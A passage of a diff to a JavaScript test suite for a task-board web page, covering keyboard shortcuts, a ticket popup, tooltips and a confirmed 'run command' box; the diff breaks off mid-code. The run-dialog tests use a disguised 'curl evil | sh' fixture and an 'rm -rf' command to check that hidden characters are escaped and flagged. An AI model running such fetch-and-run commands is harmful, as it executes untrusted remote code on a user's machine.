@@ -35,7 +35,8 @@ for (const mode of ['light', 'dark']) {
     assert.ok(contrast(colors.bad, colors['bad-bg']) >= 4.5, `${mode} error notice text`);
     // Board surfaces: the canvas around it, cards, and the tint of the your-turn lane.
     for (const [foreground, background] of [['accent', 'highlight'], ['busy', 'busy-bg'], ['ok', 'ok-bg'], ['muted', 'open-bg'], ['bad', 'bad-bg'], ['busy', 'paper'], ['busy', 'highlight'],
-      ['ink', 'card'], ['muted', 'card'], ['muted', 'canvas'], ['muted', 'lane-you'], ['accent', 'lane-you'], ['bad', 'lane-you'], ['busy', 'lane-you'], ['ok', 'card'], ['muted', 'paper']]) {
+      ['ink', 'card'], ['muted', 'card'], ['muted', 'canvas'], ['muted', 'lane-you'], ['accent', 'lane-you'], ['bad', 'lane-you'], ['busy', 'lane-you'], ['ok', 'card'], ['muted', 'paper'],
+      ['control', 'open-bg'], ['ok', 'open-bg'], ['bad', 'open-bg']]) {
       const ratio = contrast(colors[foreground], colors[background]);
       assert.ok(ratio >= 4.5, `${mode} status --${foreground} on --${background}: ${ratio.toFixed(3)}:1 < 4.5:1`);
     }
@@ -52,7 +53,7 @@ function page(hash = '', options = {}) {
       focus() { context.document.activeElement = this; },
       showModal() { this.open = true; this.modal = true; },
       show() { this.open = true; this.modal = false; },
-      close() { this.open = false; this.listeners.close?.(); },
+      close(value) { if (value !== undefined) this.returnValue = value; this.open = false; this.listeners.close?.(); },
       setAttribute(name, value) { this.attributes[name] = value; },
       matches() { return false; }, getClientRects() { return []; },
       insertBefore(child, before) {
@@ -166,7 +167,7 @@ for (const state of ['visible control', 'hidden mobile control', 'removed contro
 for (const gate of ['', 'intent']) {
   test(`Details shows the work document of a waiting item ${gate ? 'with the decision form for its gate' : 'read-only for a question'}`, async () => {
     const p = page('#t=test-token', {
-      source: source.replace("await import('./markdown.js')", '({ renderMarkdown: text => text })'),
+      source: source.replace("await import('./markdown.js')", '({ renderMarkdown: text => text, addCopyButtons() {} })'),
       fetch: async url => url === '/api/items' ? new Promise(() => {}) : {
         ok: true, text: async () => JSON.stringify({ gate, file: '/p/.sdlc/work/x/intent.md', markdown: '# Scope', sha: 'a'.repeat(64) })
       }
@@ -186,7 +187,7 @@ for (const gate of ['', 'intent']) {
 
 test('Details opens the brief of a plain item as a read-only document', async () => {
   const p = page('#t=test-token', {
-    source: source.replace("await import('./markdown.js')", '({ renderMarkdown: text => text })'),
+    source: source.replace("await import('./markdown.js')", '({ renderMarkdown: text => text, addCopyButtons() {} })'),
     fetch: async url => url === '/api/items' ? new Promise(() => {}) : {
       ok: true, text: async () => JSON.stringify({ gate: '', file: '/briefs/vendor.md', markdown: '# Brief', sha: 'a'.repeat(64) })
     }
@@ -388,7 +389,7 @@ test('a multi-line reply or note is sent as one line, which the server and inbox
 test('B1: an artifact response cannot replace the version of the item shown in Details', async () => {
   const p = page('#t=test-token', {
     // Stub only Markdown rendering; the real artifact request and item binding run in the VM.
-    source: source.replace("await import('./markdown.js')", '({ renderMarkdown: text => text })'),
+    source: source.replace("await import('./markdown.js')", '({ renderMarkdown: text => text, addCopyButtons() {} })'),
     fetch: async url => url === '/api/items' ? new Promise(() => {}) : {
       ok: true, text: async () => JSON.stringify({ gate: 'intent', markdown: '# Scope', sha: 'a'.repeat(64), version: 'server-B' })
     }
@@ -632,16 +633,21 @@ test('board hook: views subscribe to snapshots and read the feed the server sent
 // The board (board.js) in its own VM over a fake DOM, reading state and acting through the list page's todoPage.
 const boardSource = readFileSync(new URL('../todo/page/board.js', import.meta.url), 'utf8');
 function boardPage(p) {
-  const nodes = new Map();
+  const nodes = new Map(), docListeners = {}, opened = [];
   const make = () => {
     const n = {
       dataset: {}, value: '', hidden: false, textContent: '', title: '', elements: [], children: [], attributes: {}, listeners: {},
-      style: { setProperty() {}, removeProperty() {} }, offsetWidth: 0, clientWidth: 0,
-      classList: { contains() { return false; }, toggle() {}, add() {}, remove() {} },
+      style: { props: {}, setProperty(name, value) { this.props[name] = value; }, removeProperty(name) { delete this.props[name]; } },
+      offsetWidth: 0, offsetHeight: 0, clientWidth: 0, classOps: [],
+      classList: { contains() { return false; }, toggle(name) { n.classOps.push(['toggle', name]); }, add(name) { n.classOps.push(['add', name]); }, remove(name) { n.classOps.push(['remove', name]); } },
       addEventListener(type, fn) { this.listeners[type] = fn; },
-      setAttribute(name, value) { this.attributes[name] = String(value); }, toggleAttribute() {}, removeAttribute() {},
-      querySelector: () => make(), querySelectorAll: () => [],
-      focus() {}, scrollIntoView() {}, requestSubmit() {},
+      setAttribute(name, value) { this.attributes[name] = String(value); }, toggleAttribute() {},
+      getAttribute(name) { return this.attributes[name] ?? null; }, hasAttribute(name) { return name in this.attributes; },
+      removeAttribute(name) { delete this.attributes[name]; },
+      querySelector: () => make(), querySelectorAll: () => [], matches: () => false, closest: () => null, contains: () => false,
+      getClientRects: () => [{}], getBoundingClientRect: () => ({ left: 100, top: 100, right: 180, bottom: 136, width: 80, height: 36 }),
+      focus() { context.document.activeElement = this; }, scrollIntoView() {}, click() { this.listeners.click?.({}); },
+      requestSubmit() { this.listeners.submit?.({ preventDefault() {} }); }, showModal() { this.open = true; },
       append(...children) { this.children.push(...children); }, replaceChildren(...children) { this.children = children; },
       insertBefore(child, before) { const at = before ? this.children.indexOf(before) : -1; this.children.splice(at < 0 ? this.children.length : at, 0, child); },
       remove() {}, get lastElementChild() { return this.children.at(-1); }
@@ -649,17 +655,28 @@ function boardPage(p) {
     return n;
   };
   const node = id => { if (!nodes.has(id)) nodes.set(id, make()); return nodes.get(id); };
+  const rootStyle = { props: {}, setProperty(name, value) { this.props[name] = value; }, removeProperty(name) { delete this.props[name]; } };
   const context = vm.createContext({
     todoPage: p.context.todoPage,
-    document: { getElementById: node, createElement: () => make(), createTextNode: text => ({ textContent: text }), addEventListener() {},
-      documentElement: { style: { setProperty() {}, removeProperty() {} } }, body: { dataset: {}, classList: { add() {}, remove() {} } }, activeElement: null },
+    document: { getElementById: node, createElement: () => make(), createTextNode: text => ({ textContent: text }),
+      addEventListener(type, fn) { (docListeners[type] ||= []).push(fn); },
+      documentElement: { style: rootStyle }, body: { dataset: {}, classList: { add() {}, remove() {} } }, activeElement: null },
     matchMedia: () => ({ matches: false, addEventListener() {} }), getComputedStyle: () => ({ fontSize: '16px' }),
     localStorage: { getItem: () => null, setItem() {}, removeItem() {} }, ResizeObserver: class { observe() {} },
-    setTimeout, clearTimeout, setInterval() {}, Intl, Date,
+    screen: { availWidth: 1440, availHeight: 900, availLeft: 0, availTop: 0 }, innerWidth: 1440, innerHeight: 900,
+    addEventListener() {},
+    open(url, name, features) { const win = { url, name, features, closed: false, focus() {}, location: { href: url } }; opened.push(win); return win; },
+    setTimeout, clearTimeout, setInterval() {}, clearInterval() {}, Intl, Date,
     ...i18n, ...status
   });
+  context.window = context;
   vm.runInContext(boardSource.replace(/^import .* from '\.\/(?:i18n|status)\.mjs';$/gm, ''), context);
-  return { context, nodes };
+  const key = (name, extra = {}) => {
+    const event = { key: name, target: context.document.body, prevented: false, preventDefault() { this.prevented = true; }, stopPropagation() {}, ...extra };
+    for (const fn of docListeners.keydown || []) fn(event);
+    return event;
+  };
+  return { context, nodes, docListeners, opened, rootStyle, key };
 }
 const boardItems = (p, list) => { p.context.boardItems = list; vm.runInContext('items = boardItems', p.context); };
 const askItem = (id, version, suggest, extra = {}) => ({ id, version, title: `T-${id} question`, done: false, status: 'waiting', waiting: 'which one?',
@@ -743,4 +760,476 @@ test('board runs: some runs without a cost mark the day sum as partial; junk val
   assert.deepEqual(en.titles, [`${en.span(runs[0])} · Done · $1.50`, `${en.span(runs[1])} · Done · 5K tokens`, `${en.span(runs[2])} · Done`]);
   assert.match(en.summary, / · cost \$1\.50 · some cost unknown$/);
   assert.match(runsBoard(runs, 'ko').summary, / · 비용 \$1\.50 · 일부 비용 모름$/);
+});
+
+// ---------- v3.3.4: ticket popup at the left, panel stays right; v3.3.3: keys, Enter to send, tooltips ----------
+const linked = (id, extra = {}) => askItem(id, 'v1', '', { link: { label: `T-${id}`, url: `https://tracker.invalid/browse/T-${id}` }, ...extra });
+function selectedBoard(list) {
+  const p = page('#t=test-token');
+  boardItems(p, list);
+  const b = boardPage(p);
+  const keyOf = id => vm.runInContext(`render(); cards.find(card => card.target.id === '${id}').key`, b.context);
+  vm.runInContext(`select('${keyOf(list[0].id)}', false)`, b.context);
+  const sent = () => p.requests.filter(r => r.url === '/api/item').map(r => JSON.parse(r.options.body));
+  return { p, b, sent, view: b.nodes.get('board-view') };
+}
+
+const features = win => Object.fromEntries(win.features.split(',').map(pair => pair.split('=')));
+
+test('ticket: the popup docks to the screen\'s left edge at 45% width and full height', () => {
+  const { b } = selectedBoard([linked('aaaaaa')]);
+  Object.assign(b.context.screen, { availWidth: 1440, availHeight: 875, availLeft: -1440, availTop: 25 });
+  b.nodes.get('panel').offsetWidth = 400;
+  assert.equal(b.key('t').prevented, true, 't opens the ticket');
+  assert.equal(b.opened.length, 1);
+  assert.equal(b.opened[0].name, 'sdlc-ticket');
+  assert.deepEqual(features(b.opened[0]), { popup: 'yes', width: '648', height: '875', left: '-1440', top: '25' },
+    'left = availLeft, top = availTop, 45% of the width, full available height');
+});
+
+test('ticket: a panel wider than 55% of the screen shrinks the popup so both fit, never below 480px', () => {
+  const widthFor = (screenWidth, panelWidth) => {
+    const { b } = selectedBoard([linked('aaaaaa')]);
+    Object.assign(b.context.screen, { availWidth: screenWidth, availLeft: 0, availTop: 0 });
+    b.nodes.get('panel').offsetWidth = panelWidth;
+    b.key('t');
+    return features(b.opened[0]);
+  };
+  assert.equal(widthFor(1440, 600).width, '648', 'a common panel leaves 45%');
+  assert.equal(widthFor(1440, 900).width, '524', 'screen less the panel less a 16px gap');
+  assert.equal(widthFor(1440, 1100).width, '480', 'the minimum');
+  assert.equal(widthFor(1440, 900).left, '0');
+});
+
+test('ticket: the panel never moves when the ticket opens, follows or closes', () => {
+  const { p, b, view } = selectedBoard([linked('aaaaaa'), linked('bbbbbb')]);
+  const panel = b.nodes.get('panel'), handle = b.nodes.get('panel-resize');
+  const side = () => ({ dock: view.dataset.dock, viewClasses: view.classOps.length, panelClasses: panel.classOps.length,
+    handleClasses: handle.classOps.length, cap: view.style.props['--panel-cap'] });
+  const before = side();
+  assert.equal(before.dock, undefined);
+  b.key('t');
+  assert.deepEqual(side(), before, 'opening changes no attribute or class on the panel');
+  b.key('j');
+  assert.equal(b.opened[0].location.href, 'https://tracker.invalid/browse/T-bbbbbb', 'the popup follows the selection');
+  b.opened[0].closed = true;
+  boardItems(p, [linked('aaaaaa', { version: 'v2' }), linked('bbbbbb')]);
+  vm.runInContext('render()', b.context);
+  b.key('t');
+  assert.equal(b.opened.length, 2, 'a closed popup opens again');
+  assert.equal(features(b.opened[1]).left, '0');
+  assert.equal(view.dataset.dock, undefined, 'closing and reopening never docks the panel');
+});
+
+test('ticket: in the tray app\'s window the page asks the app (window.ipc) and opens no popup', () => {
+  const { b } = selectedBoard([linked('aaaaaa'), linked('bbbbbb'), askItem('cccccc', 'v1', '')]);
+  const posts = [];
+  b.context.ipc = { postMessage(message) { posts.push(message); } };
+  b.key('j');
+  assert.deepEqual(posts, [], 'no ticket opened yet: a selection asks for nothing');
+  b.key('k');
+  assert.equal(b.key('t').prevented, true);
+  assert.deepEqual(posts, ['{"open":"https://tracker.invalid/browse/T-aaaaaa"}'], 'exactly one message, the open');
+  b.key('t');
+  assert.equal(posts[1], '{"open":"https://tracker.invalid/browse/T-aaaaaa"}', 'the same ticket again asks again (Chrome brings it back)');
+  b.key('j');
+  assert.equal(posts[2], '{"follow":"https://tracker.invalid/browse/T-bbbbbb"}', 'the selection follows');
+  b.key('j');
+  assert.equal(posts.length, 3, 'an item without a ticket moves nothing');
+  b.nodes.get('panel-ticket').click();
+  assert.equal(posts.length, 3, 'the button on an item without a ticket does nothing');
+  assert.equal(b.opened.length, 0, 'never window.open in the app');
+});
+
+test('ticket: in the app a link to this machine is refused with a message, not sent to the app', () => {
+  const local = (id, url) => askItem(id, 'v1', '', { link: { label: id, url } });
+  const { p, b } = selectedBoard([local('aaaaaa', 'http://127.0.0.1:5173/x'), local('bbbbbb', 'http://LOCALHOST./y'),
+    local('cccccc', 'http://[::1]:8080/'), linked('dddddd'), local('eeeeee', 'http://127.0.0.1:9/z')]);
+  const posts = [], errors = [];
+  b.context.ipc = { postMessage(message) { posts.push(message); } };
+  const shown = p.context.todoPage.showError;
+  p.context.todoPage.showError = error => errors.push(error);
+  try {
+    b.key('t'); b.key('j'); b.key('t'); b.key('j'); b.key('t');
+    assert.deepEqual(posts, [], 'no loopback address reaches the app');
+    assert.deepEqual(errors.map(error => error.key), ['panel.notTicket', 'panel.notTicket', 'panel.notTicket']);
+    b.key('j'); b.key('t');
+    assert.deepEqual(posts, ['{"open":"https://tracker.invalid/browse/T-dddddd"}']);
+    b.key('j');
+    assert.equal(posts.length, 1, 'the selection does not follow to a loopback address');
+    assert.equal(errors.length, 3, 'and says nothing for a mere selection');
+  } finally { p.context.todoPage.showError = shown; }
+  assert.equal(p.context.todoPage.t('panel.notTicket'), p.context.todoPage.lang === 'ko' ? '이 링크는 티켓 창으로 열 수 없어요' : 'This link cannot open in the ticket window');
+});
+
+test('ticket: outside the app (no window.ipc, or one without postMessage) the popup opens as before', () => {
+  const { b } = selectedBoard([linked('aaaaaa')]);
+  b.context.ipc = {};
+  b.key('t');
+  assert.equal(b.opened.length, 1);
+  assert.equal(b.opened[0].name, 'sdlc-ticket');
+});
+
+test('ticket: the panel handle keeps the right-side keys, ← widens and → narrows', () => {
+  const { b, view } = selectedBoard([linked('aaaaaa')]);
+  view.clientWidth = 1600;
+  b.nodes.get('panel').offsetWidth = 400;
+  const resize = name => { b.nodes.get('panel-resize').listeners.keydown({ key: name, shiftKey: false, preventDefault() {}, stopPropagation() {} }); return b.rootStyle.props['--panel-size']; };
+  b.key('t');
+  assert.equal(resize('ArrowLeft'), '416px', 'with the ticket open ← still widens');
+  assert.equal(resize('ArrowRight'), '384px');
+  assert.equal(resize('End'), '1216px', 'no cap: board width less 24rem');
+});
+
+test('keys: Enter sends the reply; Shift+Enter and an IME-composing Enter do not', () => {
+  const { b, sent } = selectedBoard([askItem('aaaaaa', 'v1', '조치했어요')]);
+  const field = b.nodes.get('panel-reply-text');
+  const press = extra => { const event = { key: 'Enter', shiftKey: false, prevented: false, preventDefault() { this.prevented = true; }, ...extra }; field.listeners.keydown(event); return event; };
+  assert.equal(press({ shiftKey: true }).prevented, false, 'Shift+Enter keeps its newline');
+  assert.equal(press({ isComposing: true }).prevented, true, 'composing Enter only confirms the syllable');
+  press({ keyCode: 229 });
+  assert.equal(sent().length, 0, 'nothing sent while composing or on Shift+Enter');
+  press({});
+  assert.deepEqual(sent().map(body => body.text), ['조치했어요'], 'one Enter sends the prefilled suggestion');
+});
+
+test('keys: the list reply box sends on Enter the same way', () => {
+  const p = page('#t=test-token');
+  let submitted = 0;
+  p.nodes.get('reply-form').requestSubmit = () => submitted++;
+  const press = extra => p.nodes.get('reply-text').listeners.keydown({ key: 'Enter', shiftKey: false, preventDefault() {}, ...extra });
+  press({ shiftKey: true });
+  press({ isComposing: true });
+  press({ keyCode: 229 });
+  assert.equal(submitted, 0);
+  press({});
+  assert.equal(submitted, 1);
+});
+
+test('keys: number keys press the choices; single keys do nothing inside a text box', () => {
+  const { b, sent } = selectedBoard([askItem('aaaaaa', 'v1', '', { choices: ['A안', 'B안'] })]);
+  assert.equal(b.key('2', { target: { tagName: 'TEXTAREA' } }).prevented, false, 'typing a 2 stays text');
+  for (const name of ['t', 'm', 'r', 'a', '?']) b.key(name, { target: { tagName: 'INPUT' } });
+  assert.equal(sent().length, 0);
+  assert.equal(b.nodes.get('keys-help').open, undefined);
+  assert.equal(b.key('9').prevented, false, 'no ninth choice');
+  assert.equal(b.key('2').prevented, true);
+  assert.deepEqual(sent().map(body => body.text), ['B안']);
+  const choice = b.nodes.get('panel-choices').children[0];
+  assert.equal(choice.attributes['aria-keyshortcuts'], '1');
+});
+
+test('keys: A moves focus to Approve and shows its tooltip but never approves; ? opens the key list', () => {
+  const { p, b } = selectedBoard([askItem('aaaaaa', 'v1', '')]);
+  const approve = b.nodes.get('panel-approve');
+  b.nodes.get('panel-gate').hidden = false;
+  approve.textContent = '승인';
+  assert.equal(b.key('a').prevented, true);
+  assert.equal(b.context.document.activeElement, approve);
+  assert.equal(p.requests.filter(r => r.url === '/api/approve').length, 0, 'a key never approves');
+  assert.equal(b.nodes.get('tip').hidden, false);
+  assert.equal(b.nodes.get('tip').textContent, '승인 (A, Enter)');
+  assert.equal(approve.attributes['aria-describedby'], 'tip', 'the shown tooltip describes its control');
+  assert.equal(b.key('Escape').prevented, true, 'Escape first dismisses the tooltip');
+  assert.equal(b.nodes.get('tip').hidden, true);
+  assert.equal(approve.attributes['aria-describedby'], undefined);
+  b.key('?');
+  assert.equal(b.nodes.get('keys-help').open, true);
+  assert.equal(b.nodes.get('keys-list').children.length, 26, 'thirteen keys, each a term and its action');
+});
+
+test('tooltips: each control names its action and its key, from the locale', () => {
+  const p = page('#t=test-token');
+  vm.runInContext(`setLanguage('ko')`, p.context);
+  boardItems(p, [askItem('aaaaaa', 'v1', '', { choices: ['A안'] })]);
+  const b = boardPage(p);
+  vm.runInContext(`select(cards[0].key, false)`, b.context);
+  const tip = id => vm.runInContext(`tipText(document.getElementById('${id}'))`, b.context);
+  for (const [id, text] of [['panel-ticket', '티켓 열기'], ['panel-send', '답 보내기'], ['panel-more', '자세히'], ['panel-fix', '자가 조치']]) b.nodes.get(id).textContent = text;
+  b.nodes.get('panel-prev').attributes['aria-label'] = '이전 (← 또는 k)';
+  assert.equal(tip('panel-ticket'), '티켓 열기 (T)');
+  assert.equal(tip('panel-send'), '답 보내기 (Enter)');
+  assert.equal(tip('panel-more'), '자세히 (M)');
+  assert.equal(tip('panel-fix'), '자가 조치 (F)');
+  assert.equal(tip('panel-prev'), '이전 (← 또는 k)', 'a label that already names its keys is shown as is');
+  assert.equal(b.nodes.get('panel-ticket').attributes['aria-keyshortcuts'], 'T');
+  assert.equal(b.nodes.get('panel-choices').children[0].dataset.tip, '1 · A안');
+});
+
+// ---------- a command the board runs for the person ----------
+const command = { argv: ['rm', '-rf', '/tmp/dist dev'], cwd: '/tmp', why: '남은 빌드 폴더가 다음 빌드를 막아요' };
+const withExec = (exec, extra = {}) => ({ exec, execPath: '/bin/rm', ...extra });
+function runBoard(list, result = { exitCode: 0, stdout: 'done\n', stderr: '', timedOut: false }) {
+  let finish;
+  const answered = new Promise(resolve => { finish = resolve; });
+  const p = page('#t=test-token', { fetch: async url => {
+    if (url === '/api/exec') { await answered; return { ok: true, text: async () => JSON.stringify({ exec: result }) }; }
+    return url === '/api/items' ? new Promise(() => {}) : { ok: true, text: async () => '{}' };
+  } });
+  boardItems(p, list);
+  const b = boardPage(p);
+  vm.runInContext(`select(cards[0].key, false)`, b.context);
+  const box = b.nodes.get('panel-run'), dialog = p.nodes.get('run-confirm');
+  const button = () => box.children.find(n => n.className === 'actions')?.children[0];
+  const runs = () => p.requests.filter(r => r.url === '/api/exec').map(r => JSON.parse(r.options.body));
+  return { p, b, box, dialog, button, runs, finish };
+}
+const text = node => [node.textContent || '', ...(node.children || []).map(text)].join(' ');
+
+test('run box: only an item with a command shows the block and its button, with the exact command, cwd and why', () => {
+  const plain = runBoard([askItem('aaaaaa', 'v1', '')]);
+  assert.equal(plain.box.hidden, true, 'no command, no block');
+  assert.equal(plain.button(), undefined);
+  assert.equal(plain.b.key('x').prevented, false, 'X does nothing without a command');
+  const { box, button } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
+  assert.equal(box.hidden, false);
+  const shown = text(box);
+  assert.match(shown, /Command to run/);
+  assert.ok(shown.includes("rm -rf '/tmp/dist dev'"), shown);
+  assert.match(shown, /Runs in +\/tmp/);
+  assert.ok(shown.includes(command.why));
+  assert.equal(button().textContent, 'Run command');
+  assert.equal(button().attributes['aria-keyshortcuts'], 'X');
+  const done = runBoard([askItem('aaaaaa', 'v1', '', withExec(command, { done: true, status: 'done' }))]);
+  assert.equal(done.box.hidden, true, 'a done item offers nothing to run');
+});
+
+// Keys pressed in the dialog: `on` names what has focus (the title, a text, or a button).
+const enterIn = (dialog, on = 'title', extra = {}) => {
+  const event = { key: 'Enter', target: { closest: selector => (on === 'button' && selector === 'button' ? {} : null) }, preventDefault() { this.prevented = true; }, ...extra };
+  dialog.listeners.keydown(event);
+  return event;
+};
+const settle = () => new Promise(resolve => setTimeout(resolve, 0));
+test('run box: nothing runs without the confirm dialog; Cancel and Esc run nothing, Run sends the shown version and program once', async () => {
+  const { p, b, box, dialog, button, runs, finish } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
+  button().listeners.click();
+  assert.equal(dialog.open, true, 'the button only opens the dialog');
+  assert.equal(p.nodes.get('run-confirm-command').textContent, "rm -rf '/tmp/dist dev'", 'the dialog repeats the exact command');
+  assert.equal(p.nodes.get('run-confirm-cwd').textContent, '/tmp');
+  assert.equal(p.nodes.get('run-confirm-program').textContent, '/bin/rm', 'the program that will start');
+  assert.equal(p.nodes.get('run-confirm-args').textContent, '3 arguments');
+  assert.equal(p.nodes.get('run-confirm-escaped').hidden, true, 'nothing hidden, no warning');
+  assert.equal(runs().length, 0);
+  dialog.returnValue = 'cancel'; dialog.close();
+  dialog.showModal(); dialog.returnValue = ''; dialog.close(); // Esc closes with no value
+  await settle();
+  assert.equal(runs().length, 0, 'Cancel and Esc run nothing');
+  assert.equal(b.key('x').prevented, true, 'X opens it');
+  assert.equal(dialog.open, true);
+  vm.runInContext('openedAt = 0', p.context); // past the reading pause
+  const enter = enterIn(dialog);
+  assert.equal(enter.prevented, true, 'Enter on the title confirms');
+  assert.equal(dialog.open, false);
+  await settle(); // the request starts once focus is back on the page
+  assert.deepEqual(runs(), [{ id: 'aaaaaa', version: 'v1', path: '/bin/rm' }]);
+  assert.match(text(box), /Running…/, 'a spinner while it runs');
+  assert.equal(box.attributes['aria-busy'], 'true');
+  finish();
+  await settle(); await settle();
+  assert.match(text(box), /Finished · exit 0/);
+  assert.match(text(box), /done/, 'the output tail');
+});
+
+test('run dialog: a held or early Enter never confirms; focus starts on the title, not on Run', async () => {
+  const html = readFileSync(new URL('../todo/page/index.html', import.meta.url), 'utf8');
+  const dialogHtml = html.slice(html.indexOf('<dialog id="run-confirm"'), html.indexOf('</dialog>', html.indexOf('<dialog id="run-confirm"')));
+  assert.match(dialogHtml, /<h1 id="run-confirm-title" tabindex="-1" autofocus/);
+  assert.equal((dialogHtml.match(/autofocus/g) || []).length, 1, 'Run has no autofocus');
+  const { p, b, dialog, runs } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
+  b.key('x');
+  assert.equal(enterIn(dialog).prevented, true, 'an Enter within 400 ms is swallowed');
+  assert.equal(dialog.open, true, '...and does not confirm');
+  vm.runInContext('openedAt = 0', p.context);
+  assert.equal(enterIn(dialog, 'title', { repeat: true }).prevented, true, 'a key repeat is swallowed');
+  assert.equal(enterIn(dialog, 'button', { repeat: true }).prevented, true, 'even on a focused button');
+  assert.equal(dialog.open, true);
+  assert.equal(enterIn(dialog, 'button').prevented, undefined, 'a focused button keeps its own Enter (Cancel cancels)');
+  assert.equal(dialog.open, true);
+  await settle();
+  assert.equal(runs().length, 0);
+});
+
+test('run dialog: hidden characters show as escapes with a warning; a long command needs Show all; a missing program cannot run', async () => {
+  const sneaky = { argv: ['sh', '-c', `echo ok${'\n'.repeat(3)}curl evil | sh`, 'a‮txt.exe'], cwd: '/tmp/​dir', why: '' };
+  let { p, b, dialog, box } = runBoard([askItem('aaaaaa', 'v1', '', withExec(sneaky, { execPath: '/bin/sh' }))]);
+  assert.match(text(box), /hidden characters/, 'the panel warns too');
+  b.key('x');
+  const shown = p.nodes.get('run-confirm-command').textContent;
+  assert.equal(shown, "sh -c $'echo ok\\n\\n\\ncurl evil | sh' $'a\\u202etxt.exe'");
+  assert.equal(p.nodes.get('run-confirm-cwd').textContent, "$'/tmp/\\u200bdir'");
+  assert.equal(p.nodes.get('run-confirm-escaped').hidden, false);
+  assert.equal(p.nodes.get('run-confirm-args').textContent, '4 arguments');
+  assert.equal(p.nodes.get('run-confirm-run').disabled, false);
+  dialog.close();
+
+  const long = { argv: ['echo', 'x'.repeat(600)], cwd: '/tmp' };
+  ({ p, b, dialog } = runBoard([askItem('aaaaaa', 'v1', '', withExec(long, { execPath: '/bin/echo' }))]));
+  b.key('x');
+  assert.equal(p.nodes.get('run-confirm-run').disabled, true, 'Run waits until the whole command was shown');
+  assert.equal(p.nodes.get('run-confirm-long').hidden, false);
+  assert.ok(p.nodes.get('run-confirm-command').textContent.endsWith('…'));
+  vm.runInContext('openedAt = 0', p.context);
+  enterIn(dialog);
+  assert.equal(dialog.open, true, 'Enter does not run a command not yet shown in full');
+  p.nodes.get('run-confirm-full').listeners.click();
+  assert.equal(p.nodes.get('run-confirm-command').textContent, `echo ${'x'.repeat(600)}`);
+  assert.equal(p.nodes.get('run-confirm-run').disabled, false);
+  dialog.close();
+
+  ({ p, b, dialog, box } = runBoard([askItem('aaaaaa', 'v1', '', withExec({ argv: ['gradle', 'build'], cwd: '/tmp' }, { execPath: '' }))]));
+  assert.match(text(box), /Command not found: gradle/);
+  b.key('x');
+  assert.equal(p.nodes.get('run-confirm-run').disabled, true);
+  assert.equal(p.nodes.get('run-confirm-missing').textContent, 'Command not found: gradle');
+  dialog.close();
+
+  ({ p, b, dialog, box } = runBoard([askItem('aaaaaa', 'v1', '', withExec({ argv: ['sh', '-c', 'true'], cwd: 'C:/tmp' }, { execPath: '', execUnsupported: true }))]));
+  assert.match(text(box), /On Windows the board cannot run commands yet/);
+  assert.doesNotMatch(text(box), /Command not found/);
+  b.key('x');
+  assert.equal(p.nodes.get('run-confirm-run').disabled, true);
+  assert.match(p.nodes.get('run-confirm-missing').textContent, /On Windows/);
+});
+
+test('run box: X does nothing while typing or with the key list open; the key list names X', () => {
+  const { p, b, dialog } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
+  assert.equal(b.key('x', { target: { tagName: 'TEXTAREA' } }).prevented, false);
+  assert.equal(dialog.open, undefined);
+  b.key('?');
+  assert.ok(b.nodes.get('keys-list').children.some(n => text(n).includes('Run the command')));
+  void p;
+});
+
+test('run box: the list page details show the same block and button', () => {
+  const p = page();
+  vm.runInContext(`items = [${JSON.stringify(askItem('aaaaaa', 'v1', '', withExec(command, { run: 'open -a Terminal /x.command' })))}]; openDetail('aaaaaa');`, p.context);
+  const box = p.nodes.get('detail-run');
+  assert.equal(box.hidden, false);
+  assert.ok(text(box).includes("rm -rf '/tmp/dist dev'"));
+  assert.ok(p.nodes.get('detail-fields').children.some(n => n.textContent === 'Run in a terminal'), 'the terminal run still shows beside it');
+  const button = box.children.find(n => n.className === 'actions').children[0];
+  button.listeners.click();
+  assert.equal(p.nodes.get('run-confirm').open, true);
+  assert.equal(p.requests.filter(r => r.url === '/api/exec').length, 0);
+});
+
+// ---------- copy buttons on fenced code (markdown.js) ----------
+// The page module runs from a data URL (as in todo-web.test.mjs) over a small DOM that parses renderMarkdown
+// output the way a browser does for these tags, including the five entities the renderer writes.
+const markdownSource = readFileSync(new URL('../todo/page/markdown.js', import.meta.url), 'utf8');
+const markdownModule = () => import(`data:text/javascript;base64,${Buffer.from(markdownSource).toString('base64')}`);
+function fakeDocument({ clipboard, secure = true, execResult = false } = {}) {
+  const entities = { '&amp;': '&', '&lt;': '<', '&gt;': '>', '&quot;': '"', '&#39;': "'" };
+  const doc = { execs: [], selected: null, activeElement: null };
+  const detach = node => { const list = node.parentElement?.childNodes; if (list) list.splice(list.indexOf(node), 1); node.parentElement = null; };
+  class Element {
+    constructor(tag) {
+      Object.assign(this, { tagName: tag.toUpperCase(), childNodes: [], parentElement: null, ownerDocument: doc,
+        className: '', dataset: {}, attributes: {}, listeners: {}, style: {}, value: '' });
+    }
+    get children() { return this.childNodes.filter(node => node instanceof Element); }
+    get firstElementChild() { return this.children[0] || null; }
+    get classList() { return { contains: name => this.className.split(/\s+/).includes(name) }; }
+    get textContent() { return this.childNodes.map(node => node.textContent).join(''); }
+    set textContent(text) { this.childNodes = [{ textContent: String(text) }]; }
+    set innerHTML(html) {
+      this.childNodes = [];
+      const stack = [this];
+      for (const [, close, tag, , text] of html.matchAll(/<(\/?)([a-z0-9]+)([^>]*)>|([^<]+)/g)) {
+        if (text !== undefined) stack.at(-1).childNodes.push({ textContent: text.replace(/&(?:amp|lt|gt|quot|#39);/g, e => entities[e]) });
+        else if (close) stack.pop();
+        else { const node = new Element(tag); stack.at(-1).append(node); if (tag !== 'hr') stack.push(node); }
+      }
+    }
+    append(...nodes) { for (const node of nodes) { detach(node); node.parentElement = this; this.childNodes.push(node); } }
+    replaceWith(node) { const list = this.parentElement.childNodes; detach(node); node.parentElement = this.parentElement; list[list.indexOf(this)] = node; this.parentElement = null; }
+    remove() { detach(this); }
+    setAttribute(name, value) { this.attributes[name] = String(value); }
+    addEventListener(type, fn) { this.listeners[type] = fn; }
+    click() { return this.listeners.click?.({}); }
+    select() { doc.selectedValue = this.value; }
+    focus() { doc.activeElement = this; }
+    querySelectorAll(tag) { return this.children.flatMap(node => [...(node.tagName === tag.toUpperCase() ? [node] : []), ...node.querySelectorAll(tag)]); }
+  }
+  Object.assign(doc, {
+    createElement: tag => new Element(tag), body: new Element('body'),
+    execCommand(command) { doc.execs.push([command, doc.selectedValue]); return execResult; },
+    createRange: () => ({ selectNodeContents(node) { this.node = node; } }),
+    defaultView: { isSecureContext: secure, navigator: { clipboard },
